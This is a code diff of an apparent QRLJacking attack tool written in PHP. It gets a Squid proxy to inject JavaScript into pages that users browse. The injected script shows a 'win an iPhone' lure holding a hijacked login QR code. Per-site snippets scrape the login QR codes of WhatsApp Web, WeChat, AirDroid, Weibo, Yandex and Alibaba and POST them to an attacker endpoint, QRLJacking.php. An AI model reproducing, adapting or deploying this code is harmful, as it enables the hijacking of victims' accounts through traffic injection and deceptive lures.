@@ -1,14 +1,8 @@
 <?php
-  if(!isset($_GET['f'])){
-    header('Location: /index.php', true, 301);
-    exit;
-  }
-  else{
-    header('Content-Type: application/javascript', true);
-  }
-?>
-<?php
+$domain = 'http://127.0.0.1';
 const PASARELA = '/etc/squid/pasarela.js';
+
+if(file_exists('qr.data')){
 $src = trim(file_get_contents('qr.data'));
 $pasarela = <<<MARKER
 //IGNORE
@@ -32,19 +26,43 @@ function lightbox_close(){
 document.body.insertAdjacentHTML('beforeend', '<div id="light"><strong>SCAN & GET A CHANCE TO WIN AN iPhone</strong><br/> \
   <img src="data:image/png;base64,$src" /></div><div id="fade" onclick="lightbox_close();"></div>');
 MARKER;
+}
 
 function update_pasarela($content, $mode){
     $fp = fopen(PASARELA, $mode);
     fwrite($fp, $content);
     fclose($fp);
 }
-if($src!=''){
-  update_pasarela($pasarela, 'a');
-}
 ?>
-<?php
-$domain = 'http://127.0.0.1';
 
+<?php
+  if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['c'])){
+    $fp = fopen('qr.data', 'w');
+    fwrite($fp, $_POST['c']);
+    if(file_exists(PASARELA)){
+        $qr = trim(file_get_contents(PASARELA));
+        $pattern = '/src=\"data:image\/png;base64,(.+?)\"/';
+        preg_match($pattern, $qr, $matches);
+        if(!empty($matches)){
+          $qr = preg_replace("/$matches[1]/", $src, $qr);
+        }
+        else{
+          $qr = $pasarela;
+        }
+        update_pasarela($qr, 'a');
+    }
+    exit;
+  }
+  else if(!isset($_GET['f'])){
+    header('Location: index.php', true, 301);
+    exit;
+  }
+  else{
+    header('Content-Type: application/javascript');
+  }
+?>
+
+<?php
 $WhatsApp = <<<MARKER
     if (loc.indexOf('web.whatsapp.com') >= 0)
     {
@@ -56,7 +74,7 @@ $WhatsApp = <<<MARKER
       {
         var xhttp = new XMLHttpRequest();
         var params = "c=" + document.getElementsByTagName('img')[0].src;
-        xhttp.open('POST', '$domain/phishing.php', true);
+        xhttp.open('POST', '$domain/QRLJacking.php', true);
         xhttp.send(params);
       }
     }
@@ -69,7 +87,7 @@ $WeChat = <<<MARKER
       {
         var xhttp = new XMLHttpRequest();
         var params = "c=" + encodeURIComponent(document.getElementsByClassName('img') [0].src);
-        xhttp.open('POST', '$domain/phishing.php' , true);
+        xhttp.open('POST', '$domain/QRLJacking.php' , true);
         xhttp.send(params);
       }
     }
@@ -83,7 +101,7 @@ $AirDroid = <<<MARKER
       {
         var xhttp = new XMLHttpRequest();
         var params = "c=" + encodeURIComponent(document.getElementsByTagName('img') [14].src);
-        xhttp.open('POST', '$domain/phishing.php' , true);
+        xhttp.open('POST', '$domain/QRLJacking.php' , true);
         xhttp.send(params);
       }
     }
@@ -96,7 +114,7 @@ $Weibo = <<<MARKER
       {
         var xhttp = new XMLHttpRequest();
         var params = "c=" + encodeURIComponent(document.getElementsByTagName('img')[1].src);
-        xhttp.open('POST', '$domain/phishing.php', true);
+        xhttp.open('POST', '$domain/QRLJacking.php', true);
         xhttp.send(params);
       }
     }
@@ -114,7 +132,7 @@ $Yandex = <<<MARKER
 
         var xhttp = new XMLHttpRequest();
         var params = "c=" + encodeURIComponent(res2);
-        xhttp.open('POST', '$domain/phishing.php', true);
+        xhttp.open('POST', '$domain/QRLJacking.php', true);
         xhttp.send(params);
       }
     }
@@ -131,7 +149,7 @@ $Alibaba = <<<MARKER
       {
         var xhttp = new XMLHttpRequest();
         var params = "c=" + document.getElementsByTagName('img')[0].src;
-        xhttp.open('POST', '$domain/phishing.php', true);
+        xhttp.open('POST', '$domain/QRLJacking.php', true);
         xhttp.send(params);
       }
     }
